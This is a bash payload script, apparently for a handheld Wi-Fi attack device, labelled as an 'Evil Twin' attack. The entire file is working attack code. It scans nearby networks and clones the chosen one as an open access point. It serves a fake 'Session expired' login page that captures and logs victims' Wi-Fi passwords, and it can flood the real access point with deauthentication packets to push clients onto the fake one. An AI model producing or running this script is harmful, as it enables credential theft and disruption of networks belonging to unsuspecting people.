#!/bin/bash
# Title: Evil Twin
# Author: bad-antics
# Description: Clone a target network and capture credentials
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/eviltwin"
mkdir -p "$LOOT_DIR"

PROMPT "EVIL TWIN ATTACK

Clone a legitimate network
and capture credentials.

1. Scans for target
2. Creates identical AP
3. Optional client deauth
4. Captures login attempts

Press OK to configure."

# Use monitor interface for scanning
MON_IF=""
for iface in wlan1mon wlan2mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

SPINNER_START "Scanning networks..."
rm -f /tmp/twinscan*
timeout 12 airodump-ng "$MON_IF" -w /tmp/twinscan --output-format csv 2>/dev/null &
sleep 12
killall airodump-ng 2>/dev/null
SPINNER_STOP

NET_COUNT=0
NETS=""
if [ -f /tmp/twinscan-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"
        NET_COUNT=$((NET_COUNT + 1))
        NETS="${NETS}${NET_COUNT}. ${essid}\n"
        eval "BSSID_${NET_COUNT}=\"$bssid\""
        eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
        eval "ESSID_${NET_COUNT}=\"$essid\""
        [ $NET_COUNT -ge 10 ] && break
    done < /tmp/twinscan-01.csv
fi

[ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }

PROMPT "TARGETS: $NET_COUNT

$(echo -e "$NETS")
Select target to clone."

TARGET_NUM=$(NUMBER_PICKER "Clone target #:" 1)
eval "REAL_BSSID=\"\$BSSID_${TARGET_NUM}\""
eval "REAL_CHANNEL=\"\$CH_${TARGET_NUM}\""
eval "TARGET_SSID=\"\$ESSID_${TARGET_NUM}\""

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

DEAUTH_REAL=$(CONFIRMATION_DIALOG "Deauth real AP?

Force clients to reconnect
to your evil twin?

Uses separate monitor iface.")

resp=$(CONFIRMATION_DIALOG "LAUNCH EVIL TWIN?

Clone: $TARGET_SSID
BSSID: $REAL_BSSID
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

CRED_LOG="$LOOT_DIR/twin_$(date +%Y%m%d_%H%M).txt"
echo "Evil Twin Credentials - $(date)" > "$CRED_LOG"

killall hostapd dnsmasq php aireplay-ng 2>/dev/null

# Use wlan1 for AP (stop monitor first)
AP_IF="wlan1"
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

cat > /tmp/twin_hostapd.conf << EOF
interface=$AP_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$REAL_CHANNEL
auth_algs=1
wpa=0
EOF

mkdir -p /tmp/twin_portal
cat > /tmp/twin_portal/index.html << TWINHTML
<!DOCTYPE html>
<html><head><title>$TARGET_SSID - Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px}.c{max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}h1{color:#333;text-align:center}.w{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin:15px 0;border-radius:4px;font-size:13px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}button{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:4px;font-size:16px}</style>
</head><body><div class="c"><h1>$TARGET_SSID</h1>
<div class="w">Session expired. Re-enter WiFi password.</div>
<form method="POST" action="/capture.php">
<input type="password" name="password" placeholder="WiFi Password" required>
<input type="hidden" name="ssid" value="$TARGET_SSID">
<button type="submit">Connect</button></form></div></body></html>
TWINHTML

cat > /tmp/twin_portal/capture.php << CAPPHP
<?php
\$log = "$CRED_LOG";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ssid = \$_POST['ssid'] ?? '';
\$pass = \$_POST['password'] ?? '';
file_put_contents(\$log, "[\$ts] SSID:\$ssid IP:\$ip PASS:\$pass\n", FILE_APPEND);
header("Location: /success.html");
CAPPHP

cat > /tmp/twin_portal/success.html << 'SHTML'
<!DOCTYPE html><html><head><title>Connected</title>
<style>body{font-family:Arial;text-align:center;padding:50px}.ok{color:#4caf50;font-size:60px}</style>
</head><body><div class="ok">✓</div><h1>Connected!</h1><p>Reconnecting...</p></body></html>
SHTML

LOG "Starting Evil Twin: $TARGET_SSID"

hostapd /tmp/twin_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/twin_dns.conf << EOF
interface=$AP_IF
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/twin_dns.conf 2>/dev/null

cd /tmp/twin_portal
php -S 10.0.0.1:80 2>/dev/null &

# Deauth on separate interface if requested
if [ "$DEAUTH_REAL" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    # Use wlan0mon for deauth (different radio)
    if [ -d "/sys/class/net/wlan0mon" ]; then
        LOG "Deauthing real AP on wlan0mon..."
        iwconfig wlan0mon channel "$REAL_CHANNEL" 2>/dev/null
        aireplay-ng -0 0 -a "$REAL_BSSID" wlan0mon 2>/dev/null &
    fi
fi

sleep "$DURATION"

killall hostapd dnsmasq php aireplay-ng 2>/dev/null
rm -rf /tmp/twin_portal /tmp/twin_*.conf

# Restart monitor mode
airmon-ng start wlan1 2>/dev/null

CRED_COUNT=$(grep -c "PASS:" "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "EVIL TWIN COMPLETE

Cloned: $TARGET_SSID
Duration: ${DURATION}s
Creds captured: $CRED_COUNT
Log: $CRED_LOG

Press OK to exit."
